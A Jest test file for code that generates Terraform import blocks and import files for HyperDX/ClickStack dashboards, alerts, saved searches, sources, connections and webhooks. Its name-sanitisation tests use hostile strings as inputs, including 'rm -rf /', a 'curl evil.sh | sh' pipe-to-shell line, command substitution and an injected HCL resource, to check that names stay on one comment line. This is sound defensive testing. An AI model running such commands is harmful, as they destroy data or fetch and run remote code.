import {
  buildImportBlock,
  buildImportFile,
  collectImportableResources,
  type IacImportManifest,
  type IacResourceType,
  isImportableAlert,
  isImportableDashboard,
  TERRAFORM_RESOURCE_TYPES,
  terraformResourceLabel,
} from '@/iac';

const ID = '655b1b7d9143aa1b1b73f4f4';

function emptyManifest(
  overrides: Partial<IacImportManifest> = {},
): IacImportManifest {
  return {
    dashboards: [],
    alerts: [],
    savedSearches: [],
    sources: [],
    connections: [],
    webhooks: [],
    truncatedTypes: [],
    ...overrides,
  };
}

describe('terraformResourceLabel', () => {
  // Ids, not names: a name-derived address changes on rename, and Terraform
  // reads the new address as a destroy of the object it already tracks.
  it('derives the label from the type and id, ignoring the name', () => {
    expect(
      terraformResourceLabel({
        type: 'dashboard',
        id: ID,
        name: 'HyperDX Usage!',
      }),
    ).toBe(`dashboard_${ID}`);
  });

  it('is unchanged by a rename', () => {
    expect(
      terraformResourceLabel({ type: 'alert', id: ID, name: 'Before' }),
    ).toBe(terraformResourceLabel({ type: 'alert', id: ID, name: 'After' }));
  });

  // ObjectIds can start with a digit, which Terraform rejects as an
  // identifier; the type prefix is what makes the label legal.
  it('produces a valid Terraform identifier for a digit-leading id', () => {
    expect(
      terraformResourceLabel({ type: 'source', id: '4'.repeat(24) }),
    ).toMatch(/^[a-z][a-z0-9_]*$/);
  });
});

// The alerts page and the bulk export both gate on this, so it is the single
// definition of "can the provider model this alert".
describe('isImportableAlert', () => {
  it('accepts a saved-search alert', () => {
    expect(
      isImportableAlert({ source: 'saved_search', savedSearchId: ID }),
    ).toBe(true);
  });

  it('rejects a tile alert', () => {
    expect(isImportableAlert({ source: 'tile' })).toBe(false);
  });

  it('rejects an alert with no source and no saved search', () => {
    expect(isImportableAlert({})).toBe(false);
  });

  // Reachable, not hypothetical: converting a saved-search alert to a tile
  // alert leaves the old savedSearch behind, because `makeAlert` passes
  // `savedSearch: undefined` and Mongoose 6 strips undefined from the `$set`.
  // An unconditional `||` fallback would wrongly offer this for import.
  it('rejects a tile alert carrying a stale savedSearchId', () => {
    expect(isImportableAlert({ source: 'tile', savedSearchId: ID })).toBe(
      false,
    );
  });

  // Legacy rows predate the `source` discriminator; a saved-search reference
  // is enough to identify them.
  it('accepts a legacy alert that only carries a savedSearchId', () => {
    expect(isImportableAlert({ savedSearchId: ID })).toBe(true);
  });
});

// The dashboard page and the server-side manifest filter both rest on this,
// so it is the single definition of "can Terraform own this dashboard".
describe('isImportableDashboard', () => {
  it('accepts a user-created dashboard', () => {
    expect(isImportableDashboard({})).toBe(true);
    expect(isImportableDashboard({ provisioned: false })).toBe(true);
  });

  // ProvisionDashboardsTask rewrites these wholesale on every run, so
  // Terraform managing one too would produce a permanent diff.
  it('rejects a provisioned dashboard', () => {
    expect(isImportableDashboard({ provisioned: true })).toBe(false);
  });
});

describe('buildImportBlock', () => {
  // The block form, not the CLI `terraform import` one-liner: the CLI form
  // refuses to run unless the address is already declared in configuration,
  // and this feature generates none.
  it('emits an import block with the plain-id form (never <teamId>/<id>)', () => {
    expect(
      buildImportBlock({ type: 'dashboard', id: ID, name: 'HyperDX Usage' }),
    ).toBe(
      `# HyperDX Usage\nimport {\n  to = clickhouse_clickstack_dashboard.dashboard_${ID}\n  id = "${ID}"\n}`,
    );
  });

  it('omits the comment line when the resource has no name', () => {
    expect(buildImportBlock({ type: 'alert', id: ID })).toBe(
      `import {\n  to = clickhouse_clickstack_alert.alert_${ID}\n  id = "${ID}"\n}`,
    );
  });

  // Every provider resource name is asserted, not just the two most-used
  // types: a typo in any of them produces an address Terraform cannot resolve.
  it.each(Object.keys(TERRAFORM_RESOURCE_TYPES) as IacResourceType[])(
    'maps %s to its provider resource name',
    type => {
      expect(buildImportBlock({ type, id: ID })).toContain(
        `to = ${TERRAFORM_RESOURCE_TYPES[type]}.${type}_${ID}`,
      );
    },
  );

  it('uses the documented clickhouse_clickstack_* resource names', () => {
    expect(TERRAFORM_RESOURCE_TYPES).toEqual({
      dashboard: 'clickhouse_clickstack_dashboard',
      alert: 'clickhouse_clickstack_alert',
      saved_search: 'clickhouse_clickstack_saved_search',
      source: 'clickhouse_clickstack_source',
      connection: 'clickhouse_clickstack_connection',
      webhook: 'clickhouse_clickstack_webhook',
    });
  });
});

// Names are user-controlled and now land in an HCL comment. A newline would
// end the comment and let the remainder of the name become a directive.
describe('name sanitisation', () => {
  it.each([
    'x\nrm -rf /; echo',
    'a"; curl evil.sh | sh; #',
    'evil\r\nresource "null_resource" "x" {}',
    '$(whoami)',
    '`id`',
    'tab\tseparated',
  ])('keeps a hostile name on one comment line: %s', hostile => {
    const block = buildImportBlock({ type: 'alert', id: ID, name: hostile });
    const [comment, ...rest] = block.split('\n');

    expect(comment.startsWith('# ')).toBe(true);
    // Everything after the comment is the untouched import block.
    expect(rest.join('\n')).toBe(
      `import {\n  to = clickhouse_clickstack_alert.alert_${ID}\n  id = "${ID}"\n}`,
    );
  });

  it('drops a name that is only whitespace', () => {
    expect(
      buildImportBlock({ type: 'alert', id: ID, name: ' \n\t ' }),
    ).not.toContain('#');
  });
});

describe('buildImportFile', () => {
  it('contains the provider block, import blocks, and generate-config instructions', () => {
    const otherId = 'a55b1b7d9143aa1b1b73f4f4';
    const file = buildImportFile({
      endpoint: 'https://hyperdx.example.com/api',
      resources: [
        { type: 'dashboard', id: ID, name: 'Usage' },
        { type: 'saved_search', id: otherId, name: 'Errors' },
      ],
    });
    expect(file).toContain('source  = "ClickHouse/clickhouse"');
    expect(file).toContain('version = ">= 3.22.0"');
    // `import {}` and -generate-config-out both need Terraform 1.5+; without
    // the constraint an older CLI fails with a syntax error instead.
    expect(file).toContain('required_version = ">= 1.5.0"');
    expect(file).toContain(
      'clickstack_endpoint = "https://hyperdx.example.com/api"',
    );
    expect(file).toContain('CLICKSTACK_API_KEY');
    expect(file).toContain(
      `to = clickhouse_clickstack_dashboard.dashboard_${ID}`,
    );
    expect(file).toContain(`id = "${ID}"`);
    expect(file).toContain(
      `to = clickhouse_clickstack_saved_search.saved_search_${otherId}`,
    );
    expect(file).toContain('terraform plan -generate-config-out=generated.tf');
    expect(file).not.toContain('locals'); // no connections selected
  });

  // Two same-type resources sharing a name used to collide, because the
  // address was a name slug plus five hex characters of the id. Terraform
  // rejects the whole file when two import blocks share a `to` address.
  it('emits a unique address per resource when names and id suffixes collide', () => {
    const file = buildImportFile({
      endpoint: 'https://hyperdx.example.com/api',
      resources: [
        { type: 'alert', id: `${'a'.repeat(19)}11111`, name: 'Alert' },
        { type: 'alert', id: `${'b'.repeat(19)}11111`, name: 'Alert' },
      ],
    });
    const addresses = [...file.matchAll(/^ {2}to = (.+)$/gm)].map(m => m[1]);

    expect(addresses).toHaveLength(2);
    expect(new Set(addresses).size).toBe(2);
  });

  it('explains that addresses survive a rename, and warns about whole-body writes', () => {
    const file = buildImportFile({
      endpoint: 'https://hyperdx.example.com/api',
      resources: [{ type: 'dashboard', id: ID, name: 'Usage' }],
    });
    expect(file).toContain('survive a rename');
    expect(file).toContain('written back whole');
    expect(file).toContain('delete the');
  });

  it('emits connections of unknown provenance as a locals block', () => {
    const file = buildImportFile({
      endpoint: 'https://hyperdx.example.com/api',
      resources: [],
      connectionLocals: [{ id: ID, name: 'Local ClickHouse' }],
    });
    expect(file).toContain('locals {');
    expect(file).toContain('# Local ClickHouse');
    expect(file).toContain(`connection_${ID}_id = "${ID}"`);
    expect(file).not.toContain('clickhouse_clickstack_connection');
  });

  // The only branch that emits a connection import block. Previously asserted
  // on the intermediate array but never on the generated file.
  it('emits a self-managed connection as an import block, not a local', () => {
    const { resources, connectionLocals } = collectImportableResources(
      emptyManifest({
        connections: [
          { id: ID, name: 'Self hosted', platformProvisioned: false },
        ],
      }),
      ['connection'],
    );
    const file = buildImportFile({
      endpoint: 'https://hyperdx.example.com/api',
      resources,
      connectionLocals,
    });

    expect(file).toContain(
      `to = clickhouse_clickstack_connection.connection_${ID}`,
    );
    expect(file).not.toContain('locals {');
  });
});

describe('collectImportableResources', () => {
  const manifest = emptyManifest({
    dashboards: [{ id: '1'.repeat(24), name: 'D1' }],
    alerts: [
      {
        id: '2'.repeat(24),
        name: 'A1',
        source: 'saved_search',
        savedSearchId: '4'.repeat(24),
      },
      { id: '3'.repeat(24), name: 'A2 (tile)', source: 'tile' },
    ],
    savedSearches: [{ id: '4'.repeat(24), name: 'S1' }],
  });

  it('only includes selected types and skips tile alerts with a count', () => {
    const { resources, connectionLocals, skippedAlerts } =
      collectImportableResources(manifest, ['dashboard', 'alert']);
    expect(resources).toEqual([
      { type: 'alert', id: '2'.repeat(24), name: 'A1' },
      { type: 'dashboard', id: '1'.repeat(24), name: 'D1' },
    ]);
    expect(connectionLocals).toEqual([]);
    expect(skippedAlerts).toBe(1);
  });

  const withConnections = emptyManifest({
    ...manifest,
    connections: [{ id: '6'.repeat(24), name: 'Local ClickHouse' }],
  });

  // Provenance is tri-state; only an explicit `false` licenses an import.
  it('treats a connection of unknown provenance as reference-only', () => {
    const { resources, connectionLocals } = collectImportableResources(
      withConnections,
      ['connection'],
    );
    expect(resources).toEqual([]);
    expect(connectionLocals).toEqual([
      { id: '6'.repeat(24), name: 'Local ClickHouse' },
    ]);
  });

  it('keeps a platform-provisioned connection reference-only', () => {
    const { resources, connectionLocals } = collectImportableResources(
      emptyManifest({
        ...manifest,
        connections: [
          {
            id: '6'.repeat(24),
            name: 'Cloud ClickHouse',
            platformProvisioned: true,
          },
        ],
      }),
      ['connection'],
    );
    expect(resources).toEqual([]);
    expect(connectionLocals).toHaveLength(1);
  });

  it('imports a connection the server marks self-managed', () => {
    const { resources, connectionLocals } = collectImportableResources(
      emptyManifest({
        ...manifest,
        connections: [
          {
            id: '6'.repeat(24),
            name: 'Local ClickHouse',
            platformProvisioned: false,
          },
        ],
      }),
      ['connection'],
    );
    expect(resources).toEqual([
      { type: 'connection', id: '6'.repeat(24), name: 'Local ClickHouse' },
    ]);
    expect(connectionLocals).toEqual([]);
  });

  it('emits neither when connections are not selected', () => {
    const { resources, connectionLocals } = collectImportableResources(
      withConnections,
      ['dashboard'],
    );
    expect(resources.some(r => r.type === 'connection')).toBe(false);
    expect(connectionLocals).toEqual([]);
  });
});
